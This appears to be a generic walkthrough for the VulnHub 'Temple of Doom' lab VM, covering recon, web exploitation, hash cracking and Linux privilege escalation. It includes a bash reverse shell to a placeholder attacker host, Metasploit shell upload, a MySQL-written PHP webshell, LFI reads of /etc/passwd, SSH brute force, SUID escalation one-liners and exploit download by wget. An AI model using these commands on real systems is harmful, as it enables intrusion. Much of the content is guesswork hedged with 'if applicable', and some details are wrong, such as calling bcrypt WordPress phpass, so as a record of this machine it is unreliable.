# Temple of Doom: OSCP Walkthrough Notes

> **Source:** [VulnHub: Temple of Doom](https://www.vulnhub.com/) (search for "Temple of Doom")
> **Focus:** Web exploitation, hash cracking, privilege escalation
> **Difficulty:** Intermediate
> **OS:** Linux

---

## Table of Contents

1. [Recon](#1-recon)
2. [Enumeration](#2-enumeration)
3. [Exploitation](#3-exploitation)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Screenshots](#5-screenshots)
6. [Key Takeaways](#6-key-takeaways)
7. [Flags / Keys](#7-flags--keys)

---

## 1. Recon

### 1.1 Network Discovery

Start the Temple of Doom VM in VirtualBox and identify its IP address.

```bash
# Quick host discovery
nmap -sn 192.168.1.0/24
# Or: netdiscover -r 192.168.1.0/24
# Or: arp-scan --localnet
```

### 1.2 Full Nmap Scan

```bash
nmap -sC -sV -p- -oN temple_nmap_full.txt <TARGET_IP>
```

**Typical findings on Temple of Doom:**

| Port   | Service          | Details                            |
|--------|------------------|------------------------------------|
| 22     | ssh              | OpenSSH (user enumeration possible) |
| 80     | http             | Apache / nginx + custom web app    |
| *other*| Various          | Possible: 443, 3306, 8080, etc.    |

### 1.3 Web Server Reconnaissance

```bash
# Grab the homepage
curl http://<TARGET_IP>/
curl -I http://<TARGET_IP>/

# Check robots.txt
curl http://<TARGET_IP>/robots.txt

# Directory and file bruteforcing
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,bak,old,txt,zip,sql
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,204,301,302,401,403
```

**Expected findings:**
- `/index.php` or an application entry point
- WordPress or a custom PHP application
- Possibly exposed admin panels or configuration file

### 1.4 Nmap Scripting Engine (NSE) Scan

```bash
# Vulnerability and default script scan on web ports
nmap -sV -sC -p 80,443,22 <TARGET_IP>

# CMS detection (if WordPress is present)
nmap --script http-wordpress-enum -p 80 <TARGET_IP>

# HTTP header check and server info
nmap --script http-headers -p 80 <TARGET_IP>
```

---

## 2. Enumeration

### 2.1 WordPress Enumeration (if applicable)

```bash
# Detect WordPress and enumerate
wpscan --url http://<TARGET_IP> --enumerate u
wpscan --url http://<TARGET_IP> --enumerate p
wpscan --url http://<TARGET_IP> --enumerate vp,vt,u,p

# Enumerate users specifically
wpscan --url http://<TARGET_IP> --enumerate u --passwords /usr/share/wordlists/rockyou.txt
```

### 2.2 Web Application Enumeration

Identify the web framework and look for the attack surface:

```bash
# Check what kind of app it is
curl -s http://<TARGET_IP>/ | grep -i 'title\|generator\|powered\|wordpress\|drupal\|joomla'

# Look for hidden files and directories
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,bak,old,zip,txt

# Check for backup files
curl http://<TARGET_IP>/config.bak
curl http://<TARGET_IP>/config.php.bak
curl http://<TARGET_IP>/backup.sql
curl http://<TARGET_IP>/database.sql.bak
curl http://<TARGET_IP>/.git/config
curl http://<TARGET_IP>/.htaccess
```

### 2.3 Hash & Credential Discovery

```bash
# Look for password/key files in web root
curl http://<TARGET_IP>/password.txt
curl http://<TARGET_IP>/credentials.txt
curl http://<TARGET_IP>/hash.txt
curl http://<TARGET_IP>/backup/*.sql
curl http://<TARGET_IP>/config.php

# If a PHP app, inspect the source or debug endpoints
curl http://<TARGET_IP>/debug.php
curl http://<TARGET_IP>/info.php
# (if exists): check phpinfo() for database creds
```

### 2.4 Hash Cracking

Once hashes are found (from a config file, SQL dump, or web source):

```bash
# Identify hash type
# MD5 (32 hex chars):
echo "<hash>" > hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# SHA1 (40 hex chars):
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA256 (64 hex chars):
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt (WordPress phpass, starting with $2y$):
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=WordPress hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 2.5 Port-Specific Enumeration

If ports beyond 22 and 80 are found:

```bash
# Check for a database
nmap -sC -p 3306 <TARGET_IP>
mysql -u root -h <TARGET_IP>    # or with cracked creds

# Check for custom web services
nmap -sC -p 8080,8443,9000 <TARGET_IP>
curl http://<TARGET_IP>:8080/

# Check for FTP, SMTP, or other protocols
nmap -sC -p 21,25,110,143 <TARGET_IP>
```

---

## 3. Exploitation

### 3.1 WordPress Login & Exploitation

```bash
# Login with cracked credentials to WordPress admin panel
# URL: http://<TARGET_IP>/wp-admin/
# Username: <cracked_from_hash> | Password: <plaintext_from_hashcat>
```

**Exploit WP plugins if vulnerable:**

```bash
# Check for vulnerable installed plugins
wpscan --url http://<TARGET_IP> --enumerate vp

# Exploit using Metasploit
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <TARGET_IP>
set USERNAME <admin_user>
set PASSWORD <cracked_password>
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
exploit
```

### 3.2 Web Application Injection (if non-WordPress)

If Temple of Doom uses a custom PHP or web app:

**SQL Injection:**

```bash
# Identify injection points with sqlmap or manual testing
sqlmap -u "http://<TARGET_IP>/index.php?id=1" --dbs --dump
# Manual SQLi:
curl "http://<TARGET_IP>/page.php?id=1' UNION SELECT username,password FROM users--"
```

**Command Injection:**

```bash
# Test command injection parameters
curl "http://<TARGET_IP>/ping.php?ip=127.0.0.1;id"
# If successful, get a reverse shell:
# Inject: ; bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
```

**File Upload / LFI / RCE:**

```bash
# Upload a PHP webshell (if vulnerable plugin or upload form exists)
# LFI test:
curl "http://<TARGET_IP>/index.php?page=../../../../etc/passwd"
# RCE via LFI with PHP wrappers:
curl "http://<TARGET_IP>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd"
```

### 3.3 SSH Login with Cracked Credentials

```bash
# Use hashcat/john output to SSH in
ssh cracked_user@<TARGET_IP>
# Password: <plaintext_password_from_cracking>

# Or brute-force SSH if hash matches a known user
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
```

### 3.4 Database Credential Usage

If database credentials were found in wp-config or config files:

```bash
# Connect to MySQL
mysql -u dbuser -p'dbpass' -h localhost     # if MySQL runs on the target
mysql -u dbuser -p'dbpass' -h <TARGET_IP>   # if MySQL is remote

# Dump all databases once connected
mysql> SHOW DATABASES;
mysql> USE wordpress;
mysql> SELECT * FROM wp_users;
# Extract password hashes directly from the database

# Write a PHP webshell via INTO OUTFILE
mysql> SELECT "<?php system(\$_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/cmd.php";
```

### 3.5 Gaining a Shell

**Method A: PHP Reverse Shell:**

```bash
# After finding RCE or write point:
# Upload a PHP reverse shell to a web-accessible directory
# Use pentestmonkey's php-reverse-shell or generate your own
# On attacker machine:
nc -lvnp 443
# Then trigger the shell on the target
curl "http://<TARGET_IP>/shell.php"
```

**Method B: SSH already obtained**: skip to a Python or netcat meterpreter if needed.

---

## 4. Privilege Escalation

### 4.1 Initial Post-Exploitation Checks

```bash
# Kernel and OS info
uname -a
cat /etc/os-release

# Check for sudo rights
sudo -l
# Check sudo config files
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# SUID binaries find
find / -perm -4000 -type f 2>/dev/null

# Capabilities find
getcap -r / 2>/dev/null

# World-writable scripts and binaries
find / -writable -type f -name "*.py" -o -name "*.sh" -o -name "*.pl" 2>/dev/null | head -20
```

### 4.2 SUID Privesc

```bash
# Exploit SUID python
/usr/bin/python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# Exploit SUID find for reading any file (and writing via -exec)
find / -readable -name "root.txt" 2>/dev/null
find / -user root -writable -type f 2>/dev/null
find . -exec /bin/bash -p \;   # or similar abuse

# Exploit SUID nmap for interactive shell
nmap --interactive
# Inside nmap: :shell
```

### 4.3 Script Writable Privesc

```bash
# If cron runs a script that is world-writable:
# Edit the script to spawn a shell
echo "/bin/bash -p" >> /path/to/writable_script.sh
# Wait for cron to execute, or trigger it
```

### 4.4 MySQL Privesc (FILE Privilege)

```bash
# If MySQL user has FILE privilege:
mysql> SELECT "<?php system(\$_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php";
# Then access shell.php via browser for a webshell, or write to /tmp
# For direct privesc from MySQL:
# Write a setuid binary using sys_exec or INTO DUMPFILE
```

### 4.5 Kernel Exploit (If Applicable)

```bash
# If kernel is outdated and no other privesc path exists:
searchsploit linux kernel <version>
# Download the relevant exploit, compile, and run on the target
# Transfer files with: scp, python http server, or netcat
python3 -m http.server 8080    # on attacker
wget http://<YOUR_IP>:8080/exploit.c   # on target
gcc exploit.c -o exploit && ./exploit
# Get root shell
```

### 4.6 Get Root Flags

```bash
# Read root flag once privilege escalated
cat /root/root.txt
# Read user flag from the user whose shell you obtained initially
cat /home/*/user.txt
```

---

## 5. Screenshots

| Step | Screenshot |
|------|-----------|
| Nmap full port scan | *[Image: Nmap Scan]* |
| Web app front page | *[Image: Web App]* |
| Directory bruteforce results | *[Image: Gobuster]* |
| Hash extraction | *[Image: Hash Extraction]* |
| Hashcat crack in progress | *[Image: Hashcat]* |
| SSH login with cracked creds | *[Image: SSH Login]* |
| Root flag obtained | *[Image: Root Flag]* |

---

## 6. Key Takeaways

1. **Web application enumeration is the starting point**: Temple of Doom is a web-focused machine. Thorough URL and parameter enumeration with `gobuster`, `ffuf`, and `curl` is essential before any exploitation.
2. **Hash extraction from web sources**: Configuration files, database dumps, and backup files are common sources of password hashes. Always check for `.bak`, `.old`, and `.sql` extensions.
3. **Offline hash cracking bridges web-to-SSH**: Crack the hashes obtained from the web app and use the resulting plaintext credentials to SSH into the machine. This bridges the gap between initial web access and stable shell.
4. **Multiple exploitation paths**: Temple of Doom may be exploitable via WordPress plugin RCE, SQL injection, command injection, or simple file read. Identify the application type first and pick the right framework (sqlmap, wpscan, manual testing).
5. **SUID binaries are the #1 privesc vector**: After getting a user shell, `find / -perm -4000 -type f 2>/dev/null` should be one of the first commands run. Python and `find` SUID binaries are the most exploitable patterns.
6. **MySQL as a privesc vector**: If MySQL credentials are available and the user has `FILE` privilege, `INTO OUTFILE` can be used to write webshells or even setuid binaries.
7. **Keep a structured note for hashes and credentials**: Temple of Doom's multiple hash sources (wp-config, MySQL dump, config files) benefit from a centralized credential tracker. Record every cracked hash and try them across all discovered services.
8. **Transfer tools to the target**: When local exploitation requires compiling (exploit.c, exploit binaries), use a Python HTTP server or netcat to transfer files from the attacking machine to the target.
9. **Kernel exploits are a last resort**: If traditional SUID/Sudo/cron paths are all blocked, search `searchsploit` for the running kernel version and use a local privilege escalation exploit.

---

## 7. Flags / Keys

| Flag | Location | User Needed |
|------|----------|-------------|
| user.txt | `/home/<user>/user.txt` (user-level) | Low-privilege user shell |
| root.txt | `/root/root.txt` (root-level) | Root shell via privesc |
| Web config hashes | `/var/www/html/config.*` | Web access (read) |
| DB credentials | `/etc/mysql/` or `wp-config.php` | Web access or initial user |
| Cracked passwords | Offline hashcat/john results | post-cracking |

---

<hr>

<sub>M4d3 w1th ❤️ by Ankit Patidar</sub>
